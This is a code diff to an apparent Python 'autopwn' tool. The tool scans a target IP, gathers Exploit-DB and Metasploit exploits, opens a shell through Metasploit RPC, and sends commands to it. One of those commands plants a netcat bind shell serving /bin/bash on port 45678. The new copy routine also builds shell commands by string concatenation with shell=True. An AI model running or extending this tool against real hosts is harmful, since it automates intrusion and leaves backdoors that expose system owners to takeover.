@@ -1,8 +1,12 @@
 #!/usr/bin/python3
 
+from os import path
 import subprocess
 import pprint
 import json
+from capstone import CS_OP_IMM
+
+from netaddr import P
 import autopayload
 from pymetasploit3.msfrpc import MsfRpcClient
 import time
@@ -78,8 +82,26 @@ def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, ip=IP):
         result = json.loads(f.read())
     return result
 
+def getEdbExploit(res=[]):
+    edbExploits=[]
+    for search in res:
+        edbExploits+=search["RESULTS_EXPLOIT"]
 
-def createExploitList(res=[]) -> list[str]:
+    paths =[]
+    if edbExploits:
+        paths = [pwn["Path"] for pwn in edbExploits]
+    
+    if paths:
+        k=0
+        for path in paths:
+            command = "cp " + path + " ./edb/exploit_" + str(k)
+            print(command)
+            subprocess.run(command,shell=True)
+            k+=1
+    pprint.pprint(paths)
+
+
+def createExploitList(res=[]) -> tuple[list[str],list[str]]:
     """Create exploits / metasploits lists from the list of research
     returns (titles, metaexploits)
     """
@@ -200,6 +222,7 @@ def autopwn():
 
     results = scanIp4Vulnerabilities(EXPLOIT_LIST, IP)
     (exploits, metaexploits) = createExploitList(results)
+    getEdbExploit(results)
 
     print("[~] Generic exploits :")
     if exploits:
@@ -287,6 +310,8 @@ def sendCommands(shell, sequence=[]) -> int:
 
 if len(sys.argv) > 1:
     IP = sys.argv[1]
+
+
 (shell, client, srv) = autopwn()
 
 sequence = [
@@ -300,8 +325,9 @@ sequence = [
     "nc -l -p 45678 -e /bin/bash"
 ]
 
-lol = sendCommands(shell, sequence)
+sendCommands(shell, sequence)
 
 LOG("END OF LOGS", logfile, "crit")
 logfile.close()
+
 exit(0)
